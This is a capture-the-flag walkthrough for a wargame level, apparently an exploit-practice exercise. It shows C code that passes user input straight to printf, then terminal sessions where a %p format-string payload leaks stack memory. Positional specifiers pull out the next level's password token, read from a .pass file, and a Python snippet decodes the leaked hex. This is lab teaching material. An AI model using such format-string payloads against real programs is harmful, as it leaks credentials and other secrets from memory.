# Level02

## printf args

```c
    fgets(username, 100, stdin);
    ...
    printf(username);
```

We can see that the input username is used within printf as format string.
Therefore we can exploit printf to print memory content.

## Memory content

```c
    char token[48];
    ...
    token_file = fopen("/home/users/level03/.pass", "r");
    ...
    len = fread(token, 1, 41, token_file);
```

We can observe that the content of the token is read and stored in memory.

## Printf exploit

printf allows to print all memory aside the format string.
So we can put the content of `token`

```shell
$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
--[ Password: aaaaaaaaa
*****************************************
0x7fffffffe4f0.(nil).0x61.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6e8.0x1f7ff9a08.0x6161616161616161.0x61.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d does not have access!
```

We can see that the token starts at the 22th printf's param.

```shell
$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p.%23$p.%24$p.%25$p.%26$p
--[ Password: aaaa
*****************************************
0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d does not have access!
```

## Decode Token

```python
import codecs

out = "0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d"
splited = out.replace("0x", "").split(".")
dec = "".join([codecs.decode(word, 'hex').decode('utf-8')[::-1] for word in splited])
print(dec)
```